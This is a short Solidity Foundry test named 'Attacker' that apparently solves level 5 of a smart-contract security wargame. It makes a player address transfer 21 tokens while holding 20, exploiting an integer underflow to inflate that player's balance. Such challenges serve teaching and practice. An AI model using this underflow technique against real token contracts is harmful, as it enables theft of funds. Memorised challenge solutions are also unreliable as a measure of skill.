// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel05.sol";

contract Attacker is Test {
    Token level05 = Token(0x2754CE0bB50cC2D6de392Edc65Cbbc0E351f6135);
    address player = 0xE58EB5D607D62AdDf5F16e3750FB56adD6771917;

    function test() external {
        vm.startPrank(player);
        level05.transfer(address(0), 21);

        assert(level05.balanceOf(player) > 20);
    }
}
